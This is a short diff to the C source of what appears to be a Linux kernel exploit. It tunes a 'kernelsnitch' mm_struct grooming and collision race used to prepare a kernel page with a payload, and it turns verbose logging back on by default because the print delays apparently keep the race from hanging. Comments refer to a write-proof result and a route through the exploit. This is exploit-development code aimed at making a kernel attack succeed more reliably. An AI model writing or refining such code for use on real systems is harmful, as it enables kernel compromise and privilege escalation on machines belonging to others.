@@ -169,12 +169,15 @@ int env_int_range(const char *name, int def, int min, int max) {
 
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  /* verbose=0 by default so the mm_struct scan/collision flood (hundreds of
-   * pr_info lines per groom) does not bury the pr_success ckpt lines in
-   * preload.log. Set KS_VERBOSE=1 to restore the grooming trace. */
+  /* verbose=1 by default: the kernelsnitch collision race is timing-sensitive and
+   * the last full-route run used verbose=1; silencing it (KS_VERBOSE=0) removed
+   * load-bearing print delays and hung the first groom (process SIGKILLed at the
+   * 300s launcher timeout before reaching the route). Set KS_VERBOSE=0 only if a
+   * silent groom is confirmed stable. Findability of the WRITE-PROOF result comes
+   * from the per-attempt early-break (result lands near the log tail) instead. */
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, kernelsnitch_collision_count(),
-      env_flag("KS_VERBOSE", 0), 0);
+      env_flag("KS_VERBOSE", 1), 0);
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -879,7 +882,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
       MM_STRUCT_SZ, MM_ORDER, cpu_count, kernelsnitch_collision_count(),
-      env_flag("KS_VERBOSE", 0), 0);
+      env_flag("KS_VERBOSE", 1), 0);
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
